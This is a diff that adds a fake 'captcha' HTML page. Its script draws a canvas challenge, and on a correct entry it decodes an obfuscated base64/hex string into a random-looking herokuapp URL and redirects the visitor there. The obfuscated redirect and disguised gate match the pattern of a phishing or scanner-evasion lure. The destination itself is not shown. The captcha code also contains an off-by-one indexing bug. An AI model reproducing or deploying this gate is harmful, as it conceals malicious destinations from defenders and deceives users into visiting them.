@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Captcha</title>
+</head>
+
+<body onload="createNumber()">
+
+<div align="center">
+
+<img src="abc.jpg" height="150" width="250">
+<br>
+
+
+
+
+
+
+
+
+<H4>BEFORE YOU PROCEED COMPLETE THE CAPTCHA BELOW</H4>
+<h5>please  enter the following text to the box below to continue</h5>
+
+<br>
+
+<form onsubmit="validateNumber()">
+	<div id="xdd"></div>	    
+	<input type="text" placeholder="Code" id="Dxddy"/>
+	<button type="submit">Submit</button>
+
+</form> 
+
+
+<script type="text/javascript">
+	var code;
+	function createNumber() {	 
+	  document.getElementById('xdd').innerHTML = "";
+	  var charsArray =
+	  "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	  var lengthOtp = 5;
+	  var captcha = [];
+	  for (var i = 0; i < lengthOtp; i++) {	    
+	    var index = Math.floor(Math.random() * charsArray.length + 1); 
+	    if (captcha.indexOf(charsArray[index]) == -1)
+	      captcha.push(charsArray[index]);
+	    else i--;
+	  }
+	  var canv = document.createElement("canvas");
+	  canv.id = "captcha";
+	  canv.width = 200;
+	  canv.height = 70;
+	  var ctx = canv.getContext("2d");
+	  	idata = ctx.createImageData(160, 60),   
+	    buffer32 = new Uint32Array(idata.data.buffer),  
+	    buffer_len = buffer32.length, 
+	    i = 0 
+	    for (; i < buffer_len; i++) 
+        buffer32[i] = ((255 * Math.random()) | 0) << 23; 
+	    ctx.putImageData(idata, 0, 0);
+	    ctx.font = "bolder 32px Georgia";	  
+		ctx.fillStyle = "blue";
+		ctx.fillText(captcha.join(""), 30, 30);			  
+	  	code = captcha.join("");
+	  	document.getElementById("xdd").appendChild(canv); 
+	}
+	function validateNumber() {
+	  event.preventDefault();  
+	  if (document.getElementById("Dxddy").value == code) {
+	    var XyzZZ =''
+	    var VxKKdx = atob('Njg3NDc0NzA3MzNBMkYyRjYxNzM2NjY3NzM2ODczNjQ2ODZBNkE3MzY0NjY2ODZCNzM2NDZBNjY2QjZBNjg2NjY4NjQ2ODZBNjQ2NjJFNjg2NTcyNkY2Qjc1NjE3MDcwMkU2MzZGNkQyRg==')
+	    for (var i = 0; i < VxKKdx.length; i += 2) {
+	      XyzZZ += String.fromCharCode(parseInt(VxKKdx.substr(i, 2), 16));
+	    }
+	    window.location.href = ''+XyzZZ;
+	  }else{
+	    alert("Invalid Captcha. try Again");
+	    createNumber();
+	  }  
+	}   
+</script>
+</body>
+</html>
+
+
+
